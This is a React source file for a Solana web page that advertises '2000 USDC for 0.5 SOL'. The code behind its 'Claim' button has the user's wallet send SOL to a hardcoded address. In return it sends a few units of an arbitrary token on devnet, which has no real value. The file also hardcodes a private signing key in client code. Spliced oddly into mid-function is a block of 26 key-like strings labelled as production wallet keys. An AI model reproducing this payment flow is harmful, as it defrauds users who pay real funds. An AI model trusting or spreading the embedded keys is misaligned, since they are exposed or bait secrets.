/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5qq2BHLVdZ3PhDqkF7vyVVZ1mqmHsDACqEZGyggFv9m5LiG4jFLPy3hNHeBkYcUxFEQqYCcGjqHh9SsTsAyMUWWF"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5A5LuSh2EMb5x9taPWH7u24BVU9cENcYPtS1jyDn2PCYF8c4YMz5zenQfE7i9W96gkx6fTY1C6XppHk6DTV3m6XN",
  "key1": "WYpFrc29CTbdE7XmF5EUqAEyn1A41YpGfvrQuPkVDdWzP2dSy57k17wg3MzdbQPHC9mh6JmdZquaXbqigmy8kfW",
  "key2": "2JmBUSxbNdErUB42NCvH8uVZGJtJqxMmV9bL3yFLnD77poK6HMdp8br2jcBJqK4pcwVujmwP5WU1AnnxMuCed2kz",
  "key3": "3pZyL6LRsytfrPwpVufCutQ8A3fd31DTUPUstf2tQSoCXy4YwcnUYzZNT8AdrZCnQCBieREXN5yy3D5qF8oKvq3p",
  "key4": "3djHtkrCGGkJEW6guxMTF5MLP2c6kofougZQCjPgm47pms5S858uZkFHrFoPEgJZNHqzMC4dPW8pCdL8MffBZBGV",
  "key5": "2vkLUgX2XVVpHfRPMaqLbK69QkXnbno3ad6krvyNEHCrhob9nQ5UGxN99NDJBLaAwLksRTvtmVh7N5nWYGGWzjST",
  "key6": "37N7mhfQXdxnjzvJ5mSGa65Qi4HXcwoL4sXKyLvLMyw74e9xkbLrtS1YAK2pS5XaFULPhV1ojzFMPABZL2BtNVCs",
  "key7": "3hUzkb6KB49NBg7JhjUexqY7jxk2imyr759zPZTnFCfwdugb2BD6dMRH62KsWJQfPzeMBwCLHLfbjQHhaFTX8KaS",
  "key8": "2vxMrY2e2pGLZZTDUXHm8wDLTBCTxVQaez8H7NoNFQojWiHzPge5E61dkHuNHLxBg8JWyCfFJtgP9kqKWYV7nLbC",
  "key9": "6QWkiitGsBMgW8CbWpb8vUDVUqt1yb9BVcecjHXxCZUppZDgDS4QFNb7fWmmkf6NLNFLXJxmGn8pnSQVzb5LE3Y",
  "key10": "5K3XBoRS2sqWv46s1TPXPMpaGy9YgyFniBRHanCFmXFCrhHbnioU8dboFX26GbzXbP7E9CzwdMpQXzdCEMq2B82L",
  "key11": "3fY2ydz5GQUHUKS5pmS4JwZDJdPwsusAKpUz476sPngSY6FyNHNXvSLXvS8sXvkVU8vx8Q2NqGaCZVsy1GYbAaJm",
  "key12": "2pRgGqg5B22fADGkXFv2n6wjEvkxBfNJs3WFgXeJu6JSXPDFmajDrqxJ1DibVKzA9jhALJJdRBWKrmLoqqP7CEaR",
  "key13": "pNdopWVT4QktjQpm3CnRuB8gGKXS8vnAYaWczjhqaWh452CXe34jrJQA6YvyKiwiSf2BPLATURRruRCGmWNun5E",
  "key14": "4veERC4AykWfxy2ydcFTvERggjs3AY9oaFH2w5t9kBKgPNbyHCXU8b4vAMYQRhQhksnAaco493R16k4qYvzbjzCC",
  "key15": "dbit6Gcn6RFvmaWUGjGr9ihFu6RbveE3yWyaYQwCYQHg5R7gVVTPWNRNcVR7DgEFiNx5tNPAFZr4tutXRBUfJ4N",
  "key16": "4AerQmv5xBftk218gLkATPPHX1sMnocDBLsEsq43NkRrbTzRd3tKd3MdwSz65Nd7kof2YrSNEWUNz9x9nQfGp5SP",
  "key17": "53eGuZFCRJukfpFUPMBLMarP77bTLQrdtEhBgiNEGeD4zZ7dv4ALR2h6nQ8tVZab7f6kNnAuQoJ9KrsPi7ubPkar",
  "key18": "5T1k7JijdD1VX838G2hbkV29QCncXEBadfm3novqJR2QMScDGpqaZyimjTSGXfTEEyDxwvNSsMnpw5iAJGXZ2yNP",
  "key19": "4fNrE8GvLvTjQMSHgmfZJjgSSZbf7GS7KyTx8cdMHQ1FS5AoDUWMWPMh4FtagAxsYEJ9TsVcLpwEKQGc3oCfriQm",
  "key20": "2KtCwJLoxtHh5WwC71rtcVYfdircvp6SFnB4ArmQuufRoFkTZLJeneXGwjBGosHDX9j9TJHv57o3jkh6i14ECpiM",
  "key21": "3erjxPVtXCbxWGi231KvCccjAghvL6LZ5igmPmuQj61h7xTWcr8ZZbJQ2LVFrggidQ3hEXioVYP7tU9Tzub3yYgS",
  "key22": "2NWUtVUFeCReGyEK4HUD42q6GnXiq6GxEW9rQ7Rv8mYLR9WacMci3BaGEHsTxQckAk2yKg1DmDJXsPfHKZbx4gNU",
  "key23": "3RBc8GPBWZE4yPThFPy2JstZFWhW1ggNJLp7akE4Cq3grhgfotJA2XJ8cP1dFtKV7qTq8aoSxGEWeDWxm2i8rqFX",
  "key24": "LmasLeiuR52MAHwXG1zYjM5pw7Qr5zKPgcdHj86QZjJgFpDU95LnHPiGq1CdPrmw41a8SwRrXjtwpFcEKM8arSw",
  "key25": "5gU9jzr5HMVANuz5i76pqMzu5qe6ht2A11TtWkfGhVHZQxghfPtgfU8aLmXAs5hx3kK3LtjTE2YrYfCuXCXSW7Ar"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
